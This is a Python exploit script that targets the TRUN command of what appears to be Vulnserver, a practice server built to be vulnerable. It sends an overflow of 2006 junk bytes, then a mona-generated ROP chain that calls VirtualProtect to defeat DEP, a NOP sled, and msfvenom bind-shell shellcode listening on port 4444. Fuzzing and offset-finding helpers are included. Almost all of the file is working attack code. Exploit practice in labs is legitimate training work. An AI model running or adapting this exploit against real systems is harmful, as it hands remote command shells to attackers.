#!/usr/bin/python 

import socket
import sys,os
import struct

s = None

def init():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect(ip,port):
    global s
    s.connect((ip,port))
    print s.recv(1024)

def disconnect():
    global s
    s.close()

def create_rop_chain():
    #!mona rop -m *.dll -cp nonull for find rop via immunity debugger
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77395a42,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76c62fca,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
      0x751acefe,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x7733f3e3,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x625011bb,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x773542f9,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76c890eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x7738d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76c312e1,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c890eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x766783d1,  # XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77342361,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x773c5f2e,  # &Writable location [msvcrt.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x76c1e71d,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7735181f,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x76bcade2,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def get_shellcode():
    # ../../msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c -b '\x00\x0a\x0d\xff'
    shellcode = ("\xb8\x1b\x1b\x33\x74\xdb\xcf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
	"\x53\x83\xc3\x04\x31\x43\x0e\x03\x58\x15\xd1\x81\xa2\xc1\x97"
	"\x6a\x5a\x12\xf8\xe3\xbf\x23\x38\x97\xb4\x14\x88\xd3\x98\x98"
	"\x63\xb1\x08\x2a\x01\x1e\x3f\x9b\xac\x78\x0e\x1c\x9c\xb9\x11"
	"\x9e\xdf\xed\xf1\x9f\x2f\xe0\xf0\xd8\x52\x09\xa0\xb1\x19\xbc"
	"\x54\xb5\x54\x7d\xdf\x85\x79\x05\x3c\x5d\x7b\x24\x93\xd5\x22"
	"\xe6\x12\x39\x5f\xaf\x0c\x5e\x5a\x79\xa7\x94\x10\x78\x61\xe5"
	"\xd9\xd7\x4c\xc9\x2b\x29\x89\xee\xd3\x5c\xe3\x0c\x69\x67\x30"
	"\x6e\xb5\xe2\xa2\xc8\x3e\x54\x0e\xe8\x93\x03\xc5\xe6\x58\x47"
	"\x81\xea\x5f\x84\xba\x17\xeb\x2b\x6c\x9e\xaf\x0f\xa8\xfa\x74"
	"\x31\xe9\xa6\xdb\x4e\xe9\x08\x83\xea\x62\xa4\xd0\x86\x29\xa1"
	"\x15\xab\xd1\x31\x32\xbc\xa2\x03\x9d\x16\x2c\x28\x56\xb1\xab"
	"\x4f\x4d\x05\x23\xae\x6e\x76\x6a\x75\x3a\x26\x04\x5c\x43\xad"
	"\xd4\x61\x96\x58\xdc\xc4\x49\x7f\x21\xb6\x39\x3f\x89\x5f\x50"
	"\xb0\xf6\x40\x5b\x1a\x9f\xe9\xa6\xa5\x8e\xb5\x2f\x43\xda\x55"
	"\x66\xdb\x72\x94\x5d\xd4\xe5\xe7\xb7\x4c\x81\xa0\xd1\x4b\xae"
	"\x30\xf4\xfb\x38\xbb\x1b\x38\x59\xbc\x31\x68\x0e\x2b\xcf\xf9"
	"\x7d\xcd\xd0\xd3\x15\x6e\x42\xb8\xe5\xf9\x7f\x17\xb2\xae\x4e"
	"\x6e\x56\x43\xe8\xd8\x44\x9e\x6c\x22\xcc\x45\x4d\xad\xcd\x08"
	"\xe9\x89\xdd\xd4\xf2\x95\x89\x88\xa4\x43\x67\x6f\x1f\x22\xd1"
	"\x39\xcc\xec\xb5\xbc\x3e\x2f\xc3\xc0\x6a\xd9\x2b\x70\xc3\x9c"
	"\x54\xbd\x83\x28\x2d\xa3\x33\xd6\xe4\x67\x43\x9d\xa4\xce\xcc"
	"\x78\x3d\x53\x91\x7a\xe8\x90\xac\xf8\x18\x69\x4b\xe0\x69\x6c"
	"\x17\xa6\x82\x1c\x08\x43\xa4\xb3\x29\x46")
    return shellcode

def exploit():
    #magic rop formula for this app -> exploit = junk + rop + nop + shellcode
    global s
    junk = 2006 * '\x41'
    rop_chain = create_rop_chain()
    nop = 20 * '\x90'
    shellcode = get_shellcode()
    exploit = junk + rop_chain + nop + shellcode

    s.send("TRUN ." + exploit + "\r\n")
    print s.recv(1024)
    s.send("EXIT" + "\r\n")
    print s.recv(2000)


def offset():
    global s
    with open("offset.txt", 'r') as fd:
        payload = fd.read(6000)
    s.send("TRUN ." + payload + "\r\n")
    print s.recv(1024)
    s.send("EXIT" + "\r\n")
    print s.recv(2000)


def fuzze():
    global s
    payload = 30000 * '\x41'
    s.send("TRUN ." + payload + "\r\n")
    print s.recv(1024)
    s.send("EXIT" + "\r\n")
    print s.recv(2000)
 

def main():
    init()
    connect(sys.argv[1], 9999)
    exploit()
    disconnect()

main()
